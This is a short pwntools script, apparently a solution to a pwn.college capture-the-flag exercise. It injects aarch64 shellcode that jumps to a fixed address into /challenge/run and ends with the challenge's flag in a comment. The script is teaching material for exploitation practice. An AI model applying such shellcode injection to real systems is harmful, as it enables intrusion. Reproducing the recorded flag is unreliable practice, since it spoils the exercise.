from pwn import *
context.arch = 'aarch64'

asm_bytes = asm("""
    b jump_to
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
jump_to:
    ldr x1, [sp]
    mov x0, #0x3000
    movk x0, #0x40, lsl #16
    br x0
""")

with process('/challenge/run') as p:
    p.send(asm_bytes)
    p.stdin.close()
    p.interactive()

## pwn.college{ADZYLQ_0XuxKu31UtrfmWyXmsl1.dFzM2MDL4AjMyMzW}